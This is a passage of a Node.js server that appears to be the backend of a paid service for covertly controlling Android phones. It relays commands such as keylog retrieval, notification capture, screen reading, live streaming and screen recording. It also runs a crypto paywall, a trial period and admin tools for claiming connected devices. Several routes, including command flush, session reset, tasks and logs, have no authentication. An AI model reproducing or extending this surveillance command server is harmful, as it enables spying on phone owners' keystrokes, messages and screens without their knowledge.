    const runningJobs = buildJobs.filter(j => j.status === 'running');
    res.json({
        success:              true,
        githubActionsEnabled: workerOnline(),
        callbackKeyConfigured: !!buildWorkerSettings.apiKey,
        active:               runningJobs.map(j => ({ jobId: j.id, accessId: j.accessId })),
        running:              runningJobs.length,
        recent:       recentBuildJobs.slice(0, 10).map(j => ({
            jobId: j.id, accessId: j.accessId, status: j.status,
            startedAt: j.startedAt, finishedAt: j.finishedAt,
        })),
    });
});

// ============================================
// REST ENDPOINTS
// ============================================
app.get('/api/devices', requireUserOrAdmin, async (req, res) => {
    try {
        const filter = {};
        if (req.authRole === 'user') {
            // Prefer JWT-carried accessId; fall back to a fresh DB lookup so that
            // users with old tokens (before accessId was embedded in JWTs) still work.
            let aid = req.authAccessId || '';
            if (!aid) {
                try {
                    const u = await User.findById(req.authUserId).select('accessId').lean();
                    aid = (u && u.accessId) || '';
                } catch (_) {}
            }
            if (!aid) return res.json({ success: true, devices: [] });
            filter.accessId = aid;
        }
        const devices = await Device.find(filter).sort({ lastSeen: -1 });
        res.json({ success: true, devices });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('/api/devices/:deviceId', requireUserOrAdmin, async (req, res) => {
    try {
        const device = await Device.findOne({ deviceId: req.params.deviceId });
        if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
        if (req.authRole === 'user') {
            let aid = req.authAccessId || '';
            if (!aid) {
                try {
                    const u = await User.findById(req.authUserId).select('accessId').lean();
                    aid = (u && u.accessId) || '';
                } catch (_) {}
            }
            if (!aid || (device.accessId || '') !== aid) {
                return res.status(404).json({ success: false, error: 'Device not found' });
            }
        }
        res.json({ success: true, device });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// ── Flush pending command queue — called automatically at limit or on demand ──
function flushPendingQueue(deviceId) {
    const toFlush = deviceId
        ? [...pendingCmds.entries()].filter(([, p]) => p.deviceId === deviceId)
        : [...pendingCmds.entries()];

    for (const [cid, pending] of toFlush) {
        clearTimeout(pending.timer);
        if (pending.sseId) sseSend(pending.sseId, 'command:result', {
            commandId: cid, command: pending.command, deviceId: pending.deviceId,
            success: false, error: 'Queue reset — too many pending commands',
            timestamp: new Date()
        });
        pendingCmds.delete(cid);
    }

    if (toFlush.length) {
        log('CMD', `Queue flushed — cleared ${toFlush.length} pending commands${deviceId ? ' for ' + deviceId : ''}`, 'warn');
        broadcastDash('queue:reset', { deviceId: deviceId || null, cleared: toFlush.length, timestamp: new Date() });

        // Signal the device to reset its connection so it reconnects cleanly
        const targets = deviceId ? [deviceId] : [...new Set(toFlush.map(([, p]) => p.deviceId))];
        for (const did of targets) {
            const tcpId = deviceToTcp.get(did);
            const tc    = tcpId ? tcpClients.get(tcpId) : null;
            if (tc && tc.writable) {
                tcpSend(tc, 'connection:reset', { reason: 'queue_overflow', timestamp: Date.now() });
            }
        }
    }
}

const PENDING_CMD_LIMIT = 39;

app.post('/api/commands', requireUserOrAdmin, requireActiveSubscription, async (req, res) => {
    const { deviceId, command, params, sseClientId } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });

    // ── All commands (including list_screen_recordings / get_screen_recording / delete_screen_recording)
    //    are forwarded to the device — recordings are stored ONLY on Android ──

    // ── For all commands: require device to be online ──
    const tcpConnId = deviceToTcp.get(deviceId);
    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
    if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });

    // ── Special: restart_connection — send connection:reset directly, no command queue ──
    if (command === 'restart_connection') {
        tcpSend(tcpConn, 'connection:reset', { reason: 'dashboard_request', timestamp: Date.now() });
        log('CMD', `restart_connection → ${deviceId} (connection:reset sent)`);
        return res.json({ success: true, command, deviceId, status: 'reset_sent', timestamp: new Date() });
    }

    // ── Queue overflow protection: flush at PENDING_CMD_LIMIT ──
    const devicePendingCount = [...pendingCmds.values()].filter(p => p.deviceId === deviceId).length;
    if (devicePendingCount >= PENDING_CMD_LIMIT) {
        flushPendingQueue(deviceId);
        return res.status(429).json({
            error: `Queue limit (${PENDING_CMD_LIMIT}) reached — queue has been reset. Retry your command.`,
            queueReset: true, deviceId
        });
    }

    const commandId = crypto.randomBytes(12).toString('hex');

    // Forward to device immediately — no queue, fire and forget over TCP
    tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });

    // Track streaming state so we can auto-resume after stream channel reconnects
    if (command === 'stream_start')  deviceStreamingState.add(deviceId);
    if (command === 'stream_stop')   deviceStreamingState.delete(deviceId);

    // Track pending so command:response can route the result back via SSE
    const timer = setTimeout(() => {
        if (pendingCmds.has(commandId)) {
            pendingCmds.delete(commandId);
            // Broadcast timeout to all SSE clients — SSE may have reconnected with a new ID
            broadcastDash('command:result', {
                commandId, command, deviceId, success: false,
                error: 'Command timed out', timestamp: new Date()
            });
        }
    }, CMD_TIMEOUT_MS);
    pendingCmds.set(commandId, { sseId: sseClientId || null, command, deviceId, timer });

    // Respond immediately — command already sent to device via TCP
    res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
    // Skip logging for high-frequency polling commands
    const silentCmds = new Set(['get_keylogs','get_notifications','get_notifications_from_app',
                                 'screen_reader_read','wake_screen']);
    if (!silentCmds.has(command)) {
        log('CMD', `${command} → ${deviceId} [${commandId}]`);
    }

    // Persist to DB fire-and-forget
    new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save().catch(() => {});
});

// ── Manual queue flush endpoint ───────────────────────────────────────────────
app.post('/api/commands/flush', (req, res) => {
    const { deviceId } = req.body || {};
    flushPendingQueue(deviceId || null);
    res.json({ success: true, message: 'Queue flushed', pendingBefore: pendingCmds.size });
});

// ── Dashboard session reset — called when ScreenControl / ScreenReader refreshes ──
// Clears all volatile session state for a device without touching MongoDB or the
// live TCP connection.  Specifically:
//   • Cancels every pending command timer and removes it from the in-memory map
//   • Removes the device from the active-streaming set
//   • Resets the per-device frame-relay throttle timestamp
//   • Scans Redis and deletes every command:* cache key (screenshots, frame blobs, results)
app.post('/api/device/:deviceId/reset-session', async (req, res) => {
    const { deviceId } = req.params;
    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });

    // 1. Cancel and remove all pending commands for this device
    let cleared = 0;
    for (const [cid, pending] of pendingCmds.entries()) {
        if (pending.deviceId === deviceId) {
            clearTimeout(pending.timer);
            pendingCmds.delete(cid);
            cleared++;
        }
    }

    // 2. Remove from active streaming set
    deviceStreamingState.delete(deviceId);

    // 3. Reset frame throttle timestamp
    deviceLastFrameMs.delete(deviceId);

    // 4. Clear all command:* keys from Redis (command result cache, screenshot blobs, etc.)
    const redisCleared = await R.clearCommandCache();

    log('SESSION', `reset-session for ${deviceId}: ${cleared} pending cmd(s) cleared, ${redisCleared} Redis key(s) removed`);
    res.json({ success: true, deviceId, pendingCleared: cleared, redisKeysRemoved: redisCleared });
});

// ── Task Studio — per-accessId workflow storage ───────────────────────────────
// GET /api/tasks?accessId=ACC-XXXX   → tasks for that user only
app.get('/api/tasks', async (req, res) => {
    try {
        const { accessId } = req.query;
        const query = accessId ? { accessId } : {};
        const tasks = await Task.find(query).sort({ updatedAt: -1 });
        res.json({ success: true, tasks });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// Legacy route — keep for backward compat, scoped by accessId if provided
app.get('/api/tasks/:deviceId', async (req, res) => {
    try {
        const { accessId } = req.query;
        const query = accessId ? { accessId } : { deviceId: req.params.deviceId };
        const tasks = await Task.find(query).sort({ updatedAt: -1 });
        res.json({ success: true, tasks });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.post('/api/tasks', async (req, res) => {
    const { deviceId, accessId, name, steps, scheduleOnConnect, _id } = req.body || {};
    if (!name) return res.status(400).json({ success: false, error: 'name required' });
    try {
        let task;
        if (_id) {
            task = await Task.findByIdAndUpdate(
                _id,
                { name, steps: steps || [], scheduleOnConnect: !!scheduleOnConnect, updatedAt: new Date() },
                { new: true }
            );
            if (!task) return res.status(404).json({ success: false, error: 'Task not found' });
        } else {
            task = await new Task({
                accessId:          accessId || '',
                deviceId:          deviceId || 'global',
                name,
                steps:             steps || [],
                scheduleOnConnect: !!scheduleOnConnect,
            }).save();
        }
        res.json({ success: true, task });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.delete('/api/tasks/:taskId', async (req, res) => {
    try {
        await Task.findByIdAndDelete(req.params.taskId);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));

app.get('/api/health', async (req, res) => {
    const redisStats = await R.getStats();
    res.json({
        status: 'ok',
        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
        redis: redisStats.connected
            ? `connected (${redisStats.onlineDevices} online / ${redisStats.totalDevices} total devices, mem: ${redisStats.memoryUsed})`
            : `disconnected${redisStats.error ? ' — ' + redisStats.error : ''}`,
        tcpClients: tcpClients.size,
        sseClients: sseClients.size,
        connectedDevices: deviceToTcp.size,
        pendingCommands: pendingCmds.size,
        tcpPort: TCP_PORT,
        httpPort: HTTP_PORT,
        uptime: process.uptime()
    });
});

app.get('/api/admin/users', requireAdmin, async (req, res) => {
    try {
        const docs = await User.find({}, '-password').sort({ createdAt: -1 });
        const users = docs.map(u => ({
            _id:            u._id,
            accessId:       u.accessId,
            email:          u.email,
            name:           u.name,
            role:           u.role,
            tier:           u.tier,
            isActive:       u.isActive !== false,
            trialStartDate: u.trialStartDate,
            trialEndDate:   u.trialEndDate,
            paidUntil:      u.paidUntil,
            isTrialActive:  u.isTrialActive(),
            subscription:   u.subscriptionStatus(),
            lastLogin:      u.lastLogin,
            createdAt:      u.createdAt,
            paymentHistory: (u.paymentHistory || []).slice(-10),
            loginIps:       (u.loginIps || []).slice(-20).reverse(),
        }));
        res.json({ success: true, users });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// POST /api/admin/users/:id/disable — toggle account enabled/disabled
app.post('/api/admin/users/:id/disable', requireAdmin, async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });
        user.isActive = !user.isActive;
        await user.save();
        log('ADMIN', `${user.isActive ? 'Enabled' : 'Disabled'} account for ${user.email}`);
        res.json({ success: true, isActive: user.isActive });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// DELETE /api/admin/users/:id — permanently delete a user account
app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });
        const email = user.email;
        await User.deleteOne({ _id: req.params.id });
        log('ADMIN', `Deleted user account: ${email}`);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// POST /api/admin/users/:id/block-devices — disconnect all devices belonging to this user
app.post('/api/admin/users/:id/block-devices', requireAdmin, async (req, res) => {
    try {
        let accessId = '';
        try {
            const user = await User.findById(req.params.id).select('accessId email');
            if (user) accessId = user.accessId || '';
        } catch (_) {}

        if (!accessId) {
            // Try in-memory scan if MongoDB unavailable
            for (const [, dev] of inMemoryDevices) {
                if (dev.accessId === req.body?.accessId) { accessId = dev.accessId; break; }
            }
            if (req.body?.accessId) accessId = req.body.accessId;
        }

        let blocked = 0;
        if (accessId) {
            for (const [deviceId, dev] of inMemoryDevices) {
                if (dev.accessId !== accessId) continue;
                const sock = deviceToTcp.get(deviceId);
                if (sock) { try { sock.destroy(); } catch (_) {} blocked++; }
            }
        }

        log('ADMIN', `Blocked ${blocked} device(s) for accessId=${accessId}`);
        res.json({ success: true, blocked, accessId });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// GET /api/admin/users/:id/report — download full account report as JSON
app.get('/api/admin/users/:id/report', requireAdmin, async (req, res) => {
    try {
        const user = await User.findById(req.params.id, '-password');
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });

        const devices = await getDeviceList(user.accessId);

        const report = {
            generatedAt:    new Date().toISOString(),
            user: {
                id:             user._id,
                email:          user.email,
                name:           user.name,
                accessId:       user.accessId,
                isActive:       user.isActive !== false,
                createdAt:      user.createdAt,
                lastLogin:      user.lastLogin,
            },
            subscription: {
                tier:           user.tier,
                trialStartDate: user.trialStartDate,
                trialEndDate:   user.trialEndDate,
                paidUntil:      user.paidUntil,
                status:         user.subscriptionStatus(),
                isTrialActive:  user.isTrialActive(),
            },
            loginIps:     (user.loginIps || []).slice(-20).reverse(),
            devices:      devices.map(d => ({
                deviceId:   d.deviceId,
                deviceName: d.deviceName,
                isOnline:   d.isOnline,
                lastSeen:   d.lastSeen,
                model:      d.deviceInfo?.model || '',
                manufacturer: d.deviceInfo?.manufacturer || '',
                androidVersion: d.deviceInfo?.androidVersion || '',
            })),
            paymentHistory: (user.paymentHistory || []),
        };

        const fmt = (req.query.format || 'json').toLowerCase();
        if (fmt === 'csv') {
            const rows = [
                ['Field', 'Value'],
                ['Email',         report.user.email],
                ['Name',          report.user.name],
                ['Access ID',     report.user.accessId || ''],
                ['Account Status',report.user.isActive ? 'Active' : 'Disabled'],
                ['Created',       report.user.createdAt],
                ['Last Login',    report.user.lastLogin || ''],
                ['Subscription',  report.subscription.status?.state || ''],
                ['Paid Until',    report.subscription.paidUntil || ''],
                ['Trial End',     report.subscription.trialEndDate || ''],
                [],
                ['--- Login IPs ---'],
                ['IP', 'Date'],
                ...report.loginIps.map(e => [e.ip, e.at]),
                [],
                ['--- Devices ---'],
                ['Device ID', 'Name', 'Online', 'Last Seen', 'Model'],
                ...report.devices.map(d => [d.deviceId, d.deviceName, d.isOnline ? 'Yes' : 'No', d.lastSeen || '', d.model]),
                [],
                ['--- Payment History ---'],
                ['Date', 'Status', 'Days', 'Amount USD', 'Payment ID'],
                ...report.paymentHistory.map(p => [p.receivedAt, p.status, p.extendedDays, p.amountUsd, p.paymentId]),
            ];
            const csv = rows.map(r => r.map(v => `"${String(v || '').replace(/"/g, '""')}"`).join(',')).join('\n');
            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', `attachment; filename="report-${user.email}-${Date.now()}.csv"`);
            return res.send(csv);
        }

        res.setHeader('Content-Disposition', `attachment; filename="report-${user.email}-${Date.now()}.json"`);
        res.json(report);
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// ============================================================================
// PAYMENT / SUBSCRIPTION
// ----------------------------------------------------------------------------
// Free trial: 7 days from signup (set in User pre-save hook).
// After trial ends, /api/commands returns 402; the dashboard shows a paywall
// pointing at NOWPayments. When the buyer completes payment, NOWPayments POSTs
// an IPN to /api/payment/webhook/nowpayments, which extends paidUntil by 30
// days. Admins can also grant time manually.
// ============================================================================

// GET /api/payment/me — returns current sub status + a personalised payment URL.
app.get('/api/payment/me', requireUserOrAdmin, async (req, res) => {
    if (req.authRole === 'admin') {
        return res.json({
            success: true,
            role: 'admin',
            isTrialActive: true,
            paywall: {
                priceUsd:   paymentSettings.priceUsd,
                extendDays: paymentSettings.extendDays,
                paymentUrl: paymentSettings.paymentUrl,
            },
        });
    }
    try {
        const user = await User.findById(req.authUserId).select(
            'tier email accessId trialStartDate trialEndDate paidUntil'
        );
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        res.json({
            success: true,
            role: 'user',
            email: user.email,
            tier:  user.tier,
            trialStartDate: user.trialStartDate,
            trialEndDate:   user.trialEndDate,
            paidUntil:      user.paidUntil,
            isTrialActive:  user.isTrialActive(),
            trialDaysLeft:  user.trialDaysLeft(),
            subscription:   user.subscriptionStatus(),
            paywall: {
                priceUsd:   paymentSettings.priceUsd,
                extendDays: paymentSettings.extendDays,
                paymentUrl: buildPaymentUrl(user),
            },
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/payment/webhook/nowpayments — IPN endpoint for NOWPayments.
// Verifies HMAC-SHA512(JSON-with-sorted-keys, ipnSecret) against the
// `x-nowpayments-sig` header. On a `finished` payment, locates the user by
// `order_id` (we set this to the user's _id when building the payment URL) or
// by `customer_email` as a fallback, then extends `paidUntil` by 30 days.
app.post('/api/payment/webhook/nowpayments', async (req, res) => {
    try {
        const sig    = req.headers['x-nowpayments-sig'];
        const secret = paymentSettings.ipnSecret;
        const body   = req.body || {};

        if (!secret) {
            log('PAYMENT', 'Webhook hit but NOWPAYMENTS_IPN_SECRET is not set — refusing', 'warn');
            return res.status(503).json({ error: 'webhook_secret_not_configured' });
        }
        if (!sig) {
            log('PAYMENT', 'Webhook missing x-nowpayments-sig header', 'warn');
            return res.status(401).json({ error: 'missing_signature' });
        }

        const sortedJson = JSON.stringify(sortKeysDeep(body));
        const expected   = crypto.createHmac('sha512', secret).update(sortedJson).digest('hex');
        const sigBuf     = Buffer.from(String(sig), 'hex');
        const expBuf     = Buffer.from(expected, 'hex');
        if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) {
            log('PAYMENT', 'Webhook signature mismatch — rejecting', 'warn');
            return res.status(401).json({ error: 'bad_signature' });
        }

        const status      = String(body.payment_status || body.status || '').toLowerCase();
        const orderId     = body.order_id || body.orderId || '';
        const customerEm  = body.customer_email || body.payer_email || body.email || '';
        const paymentId   = body.payment_id || body.paymentId || '';
        const invoiceId   = body.invoice_id || body.iid || '';
        const amountUsd   = Number(body.price_amount || body.priceAmount || 0);
        const payAmount   = Number(body.actually_paid || body.pay_amount || 0);
        const payCurrency = String(body.pay_currency || body.payCurrency || '');

        log('PAYMENT', `IPN received: status=${status} order_id=${orderId} email=${customerEm} usd=${amountUsd}`);

        // Acknowledge non-final states without modifying the account.
        const finalStates = new Set(['finished', 'confirmed', 'partially_paid']);
        if (!finalStates.has(status)) {
            return res.json({ ok: true, ignored: status });
        }

        // Locate the user by order_id (= our Mongo _id) or fall back to email.
        let user = null;
        if (orderId && mongoose.isValidObjectId(orderId)) {
            user = await User.findById(orderId);
        }
        if (!user && customerEm) {
            user = await User.findOne({ email: String(customerEm).toLowerCase().trim() });
        }
        if (!user) {
            log('PAYMENT', `No matching user for IPN (order_id=${orderId}, email=${customerEm})`, 'warn');
            return res.status(404).json({ error: 'user_not_found' });
        }

        // Idempotency: if we've already credited this paymentId, just ack.
        if (paymentId && (user.paymentHistory || []).some(p => p.paymentId === String(paymentId) && p.status === status)) {
            log('PAYMENT', `Duplicate IPN for payment ${paymentId} — already credited`);
            return res.json({ ok: true, duplicate: true });
        }

        const now      = new Date();
        const extend   = paymentSettings.extendDays;
        const baseline = user.paidUntil && user.paidUntil > now ? user.paidUntil : now;
        user.paidUntil = new Date(baseline.getTime() + extend * 24 * 60 * 60 * 1000);
        user.tier      = 'paid';
        user.paymentHistory = (user.paymentHistory || []).slice(-49);
        user.paymentHistory.push({
            paymentId:    String(paymentId || ''),
            invoiceId:    String(invoiceId || ''),
            status,
            amountUsd,
            payAmount,
            payCurrency,
            receivedAt:   now,
            extendedDays: extend,
        });
        await user.save();
        log('PAYMENT', `Credited ${extend} day(s) to ${user.email} — paidUntil=${user.paidUntil.toISOString()}`);

        return res.json({ ok: true, paidUntil: user.paidUntil });
    } catch (e) {
        log('PAYMENT', `Webhook error: ${e.message}`, 'error');
        return res.status(500).json({ error: e.message });
    }
});

// GET /api/admin/payment — returns webhook URL + secret status (admin only).
app.get('/api/admin/payment', requireAdmin, (req, res) => {
    const host = req.get('x-forwarded-host') || req.get('host') || `localhost:${HTTP_PORT}`;
    const proto = req.get('x-forwarded-proto') || (req.secure ? 'https' : 'http');
    res.json({
        success: true,
        webhookUrl:    `${proto}://${host}/api/payment/webhook/nowpayments`,
        ipnSecretSet:  !!paymentSettings.ipnSecret,
        ipnSecretMask: paymentSettings.ipnSecret
            ? '***' + paymentSettings.ipnSecret.slice(-6)
            : '',
        paymentUrl:    paymentSettings.paymentUrl,
        priceUsd:      paymentSettings.priceUsd,
        extendDays:    paymentSettings.extendDays,
    });
});

// POST /api/admin/payment — set IPN secret / payment URL (admin only).
app.post('/api/admin/payment', requireAdmin, (req, res) => {
    const { ipnSecret, paymentUrl, priceUsd, extendDays } = req.body || {};
    if (typeof ipnSecret === 'string' && !ipnSecret.startsWith('***')) {
        paymentSettings.ipnSecret = ipnSecret.trim();
    }
    if (typeof paymentUrl === 'string' && paymentUrl.trim()) {
        paymentSettings.paymentUrl = paymentUrl.trim();
    }
    if (Number.isFinite(Number(priceUsd))   && Number(priceUsd) > 0)   paymentSettings.priceUsd   = Number(priceUsd);
    if (Number.isFinite(Number(extendDays)) && Number(extendDays) > 0) paymentSettings.extendDays = Number(extendDays);
    log('PAYMENT', `Admin updated payment settings (ipnSecretSet=${!!paymentSettings.ipnSecret})`);
    res.json({ success: true });
});

// POST /api/admin/users/:id/grant-month — admin manually credits 30 days.
app.post('/api/admin/users/:id/grant-month', requireAdmin, async (req, res) => {
    try {
        const days = Math.max(1, Math.min(3650, Number(req.body?.days || paymentSettings.extendDays)));
        const user = await User.findById(req.params.id);
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });
        const now      = new Date();
        const baseline = user.paidUntil && user.paidUntil > now ? user.paidUntil : now;
        user.paidUntil = new Date(baseline.getTime() + days * 24 * 60 * 60 * 1000);
        user.tier      = 'paid';
        user.paymentHistory = (user.paymentHistory || []).slice(-49);
        user.paymentHistory.push({
            paymentId:    `manual-${Date.now()}`,
            invoiceId:    '',
            status:       'manual_grant',
            amountUsd:    0,
            receivedAt:   now,
            extendedDays: days,
        });
        await user.save();
        log('PAYMENT', `Admin granted ${days}d to ${user.email} — paidUntil=${user.paidUntil.toISOString()}`);
        res.json({ success: true, paidUntil: user.paidUntil });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/admin/users/:id/revoke-paid — admin clears paid window.
app.post('/api/admin/users/:id/revoke-paid', requireAdmin, async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });
        user.paidUntil = null;
        user.tier      = 'free';
        await user.save();
        log('PAYMENT', `Admin revoked paid status for ${user.email}`);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/admin/devices/:deviceId/assign — assign a device to a user by accessId.
// Lets an admin link any device (including ones that connected without an accessId)
// to a specific user's account so they can see and control it.
app.post('/api/admin/devices/:deviceId/assign', requireAdmin, express.json(), async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { accessId } = req.body || {};
        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });

        const newAccessId = (accessId || '').trim();

        // Update in-memory registry
        const mem = inMemoryDevices.get(deviceId);
        if (mem) {
            mem.accessId = newAccessId;
            inMemoryDevices.set(deviceId, mem);
            R.saveDevice(deviceId, mem).catch(() => {});
        }

        // Update MongoDB if available
        try {
            const dev = await Device.findOne({ deviceId });
            if (dev) {
                dev.accessId = newAccessId;
                await dev.save();
            } else if (mem) {
                await new Device({ deviceId, accessId: newAccessId, deviceName: mem.deviceName || deviceId,
                    isOnline: !!deviceToTcp.has(deviceId), lastSeen: new Date() }).save();
            }
        } catch (_) { /* MongoDB unavailable — in-memory already updated */ }

        // Rebroadcast device list so dashboards update instantly
        broadcastDeviceList();

        log('ADMIN', `Assigned device ${deviceId} → accessId=${newAccessId || '(none)'}`);
        res.json({ success: true, deviceId, accessId: newAccessId });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// GET /api/admin/devices — full device list with accessId for admin device management
app.get('/api/admin/devices', requireAdmin, async (req, res) => {
    try {
        const list = await getDeviceList(null);   // null = admin, no filter
        res.json({ success: true, devices: list });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// Recordings are stored ONLY on the Android device.
// Use list_screen_recordings / get_screen_recording / delete_screen_recording commands via /api/commands.

// ── Runtime Logs API ──────────────────────────────────────────────────────────
app.get('/api/logs', (req, res) => {
    res.json({ success: true, logs: logBuffer });
});

app.get('/api/logs/stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    res.write(`data: ${JSON.stringify({ ts: Date.now(), source: 'system', level: 'info', message: `[stream connected] sending ${logBuffer.length} buffered entries` })}\n\n`);
    logBuffer.forEach(entry => res.write(`data: ${JSON.stringify(entry)}\n\n`));

    logClients.add(res);
    req.on('close', () => logClients.delete(res));
});

app.get('*', (req, res) => {
    const fp = path.join(__dirname, 'public', req.path);
    if (fs.existsSync(fp) && fs.statSync(fp).isFile()) res.sendFile(fp);
    else {
        const index = path.join(__dirname, 'public', 'index.html');
        if (fs.existsSync(index)) res.sendFile(index);
        else res.status(404).send('Dashboard not built. Run: npm run build');
    }
});

// ============================================
// DB HELPERS
// ============================================
async function getDeviceList(accessIdFilter) {
    // Helper: override isOnline to match the live TCP socket map so the
    // dashboard never shows a device as online when commands would fail.
    const reconcile = (devices) => devices.map(d => {
        const obj = d.toObject ? d.toObject() : { ...d };
        obj.isOnline = deviceToTcp.has(obj.deviceId);
        return obj;
    });
    // Apply per-client access-id scoping. Admins call this without a filter
    // and get every device. Users call this with their own accessId and only
    // see devices that registered with the same id.
    const scope = (devices) => {
        if (!accessIdFilter) return devices;
        return devices.filter(d => (d.accessId || '') === accessIdFilter);
    };

    // Priority: MongoDB → Redis → in-memory
    try {
        const dbDevices = await Device.find().sort({ lastSeen: -1 });
        if (dbDevices && dbDevices.length > 0) return scope(reconcile(dbDevices));
    } catch (_) {}
    // Fallback: Redis
    const redisDevices = await R.getAllDevices();
    if (redisDevices.length > 0) return scope(reconcile(redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen))));
    // Final fallback: in-memory
    return scope(reconcile(Array.from(inMemoryDevices.values())));
}

// Broadcast device:list to every connected dashboard, scoped per recipient.
// Admins always receive the full list; users only see devices matching their
// accessId. Sending one filtered payload per client is a tiny cost compared
// to the round-trip latency improvement of doing it server-side.
async function broadcastDeviceList() {
    if (sseClients.size === 0) return;
    const adminList = await getDeviceList();
    const userListCache = new Map();
    for (const [id, client] of sseClients) {
        let list = adminList;
        if (client.role === 'user') {
            const aid = client.accessId || '';
            if (!aid) { list = []; }
            else if (userListCache.has(aid)) { list = userListCache.get(aid); }
            else {
                list = adminList.filter(d => (d.accessId || '') === aid);
                userListCache.set(aid, list);
            }
        }
        sseSend(id, 'device:list', list);
    }
}

// Broadcast an event to admin SSE clients and to user SSE clients whose
// accessId matches the device's accessId. Pass `accessId=null` to broadcast
// to admins only (or to all if no accessId scoping applies).
function broadcastDashScoped(event, data, accessId) {
    if (sseClients.size === 0) return;
    const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const [, client] of sseClients) {
        if (client.role === 'user') {
            if (!accessId || (client.accessId || '') !== accessId) continue;
        }
        try { client.res.write(payload); } catch (_) {}
    }
}

// ============================================
// PERIODIC TASKS
// ============================================

// Ping TCP clients (Android devices) — record send time for server-side RTT measurement
setInterval(() => {
    const now = Date.now();
    for (const conn of tcpClients.values()) {
        if (!conn.writable) continue;
        // Only ping the primary channel (it replies with device:pong on the same socket)
        if (!conn.channelType && conn.deviceId) devicePingTime.set(conn.deviceId, now);
        tcpSend(conn, 'device:ping', { timestamp: now });
    }
}, PING_INTERVAL);

// Drop stale TCP connections — handle primary and secondary channels separately
setInterval(async () => {
    const now = Date.now();
    for (const [id, conn] of tcpClients) {
        if (!conn.deviceId) continue;
        if (now - conn.lastPong > PONG_TIMEOUT) {
            log('TCP', `Device ${conn.deviceId} timed out, dropping (channel: ${conn.channelType || 'primary'})`);
            tcpClients.delete(id);
            conn.destroy();

            if (conn.channelType === 'stream') {
                // Only remove stream ref if this IS the current active stream socket
                if (deviceToStreamTcp.get(conn.deviceId) === id) deviceToStreamTcp.delete(conn.deviceId);
            } else if (conn.channelType === 'live') {
                // Only remove live ref if this IS the current active live socket
                if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
            } else {
                // Primary channel — only mark offline if no newer primary has already taken over.
                if (deviceToTcp.get(conn.deviceId) !== id) {
                    continue; // Ghost socket from previous reconnect — discard silently
                }
                deviceToTcp.delete(conn.deviceId);
                try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
                {
                    const rec = inMemoryDevices.get(conn.deviceId);
                    const aid = (rec && rec.accessId) || '';
                    broadcastDashScoped('device:disconnected', { deviceId: conn.deviceId, accessId: aid, timestamp: new Date() }, aid || null);
                }
                broadcastDeviceList();
            }
        }
    }
}, 10000);

// Mark DB devices offline if not seen in 60s
setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - 60000);
        await Device.updateMany({ lastSeen: { $lt: cutoff }, isOnline: true }, { isOnline: false });
    } catch (e) {}
}, 30000);

// ============================================
// START
// ============================================

// Kill any stale process holding our ports before binding
const { execSync } = require('child_process');
try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
try { execSync(`fuser -k ${TCP_PORT}/tcp  2>/dev/null`); } catch (_) {}

server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        log('HTTP', `Port ${HTTP_PORT} still in use — retrying in 2s…`);
        setTimeout(() => {
            try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
            server.listen(HTTP_PORT);
        }, 2000);
    } else {
        throw err;
    }
});

function _logBuildWorkerStatus() {
    const ghToken = (process.env.GITHUB_PERSONAL_ACCESS_TOKEN || '').trim();
    if (ghToken) {
